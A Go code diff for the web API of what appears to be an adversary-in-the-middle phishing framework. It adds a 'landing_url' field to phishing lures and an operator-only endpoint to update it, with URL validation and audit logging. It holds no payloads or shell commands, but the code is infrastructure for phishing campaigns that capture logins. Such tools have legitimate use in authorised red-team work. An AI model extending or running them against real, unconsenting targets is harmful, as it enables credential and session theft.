@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"math"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -113,6 +114,7 @@ func (w *WebAPI) Start(port int) {
 	mux.HandleFunc("/api/lures", w.requireAuth(w.handleLures))
 	mux.HandleFunc("/api/lures/get-url", w.requireAuth(w.handleLureGetUrl))
 	mux.HandleFunc("/api/lures/create", w.requireOperator(w.handleLureCreate))
+	mux.HandleFunc("/api/lures/update", w.requireOperator(w.handleLureUpdate))
 	mux.HandleFunc("/api/lures/delete", w.requireOperator(w.handleLureDelete))
 
 	// GoPhish endpoints (read-only)
@@ -492,6 +494,7 @@ func (w *WebAPI) handleConfigFull(rw http.ResponseWriter, req *http.Request) {
 				"hostname":        l.Hostname,
 				"path":            l.Path,
 				"redirect":        l.RedirectUrl,
+				"landing_url":     l.LandingUrl,
 				"redirector":      l.Redirector,
 				"post_redirector": l.PostRedirector,
 				"info":            l.Info,
@@ -957,6 +960,7 @@ func (w *WebAPI) handleLures(rw http.ResponseWriter, req *http.Request) {
 				"hostname":        hostname,
 				"path":            l.Path,
 				"redirect_url":    l.RedirectUrl,
+				"landing_url":     l.LandingUrl,
 				"redirector":      l.Redirector,
 				"post_redirector": l.PostRedirector,
 				"ua_filter":       l.UserAgentFilter,
@@ -1047,6 +1051,7 @@ func (w *WebAPI) handleLureCreate(rw http.ResponseWriter, req *http.Request) {
 		Phishlet       string `json:"phishlet"`
 		Path           string `json:"path"`
 		RedirectUrl    string `json:"redirect_url"`
+		LandingUrl     string `json:"landing_url"`
 		Redirector     string `json:"redirector"`
 		PostRedirector string `json:"post_redirector"`
 		Info           string `json:"info"`
@@ -1083,6 +1088,7 @@ func (w *WebAPI) handleLureCreate(rw http.ResponseWriter, req *http.Request) {
 		Phishlet:       payload.Phishlet,
 		Path:           path,
 		RedirectUrl:    payload.RedirectUrl,
+		LandingUrl:     payload.LandingUrl,
 		Redirector:     payload.Redirector,
 		PostRedirector: payload.PostRedirector,
 		Info:           payload.Info,
@@ -1126,7 +1132,62 @@ func (w *WebAPI) handleLureCreate(rw http.ResponseWriter, req *http.Request) {
 		"path":         l.Path,
 		"hostname":     l.Hostname,
 		"redirect_url": l.RedirectUrl,
+		"landing_url":  l.LandingUrl,
 		"info":         l.Info,
+	})
+}
+
+func (w *WebAPI) handleLureUpdate(rw http.ResponseWriter, req *http.Request) {
+	if req.Method != http.MethodPost {
+		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	var payload struct {
+		Index      int    `json:"index"`
+		LandingUrl string `json:"landing_url"`
+	}
+	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
+		writeJSON(rw, http.StatusBadRequest, map[string]string{"error": "invalid request body"})
+		return
+	}
+
+	if payload.LandingUrl != "" {
+		u, err := url.Parse(payload.LandingUrl)
+		if err != nil {
+			writeJSON(rw, http.StatusBadRequest, map[string]string{"error": "invalid landing_url"})
+			return
+		}
+		if u.Path == "" && u.Host == "" {
+			writeJSON(rw, http.StatusBadRequest, map[string]string{"error": "landing_url must be an absolute url or a path"})
+			return
+		}
+	}
+
+	l, err := w.cfg.GetLure(payload.Index)
+	if err != nil {
+		writeJSON(rw, http.StatusNotFound, map[string]string{"error": "lure not found"})
+		return
+	}
+
+	l.LandingUrl = payload.LandingUrl
+	if err := w.cfg.SetLure(payload.Index, l); err != nil {
+		writeJSON(rw, http.StatusInternalServerError, map[string]string{"error": "failed to update lure"})
+		return
+	}
+
+	user, _ := w.getUserFromRequest(req)
+	username := "unknown"
+	if user != nil {
+		username = user.Username
+	}
+	clientIP := getClientIP(req)
+	w.db.CreateAuditEntry(username, "update_lure", fmt.Sprintf("Updated landing_url for lure at index %d", payload.Index), clientIP)
+
+	writeJSON(rw, http.StatusOK, map[string]interface{}{
+		"message":     "Lure updated",
+		"index":       payload.Index,
+		"landing_url": l.LandingUrl,
 	})
 }
 
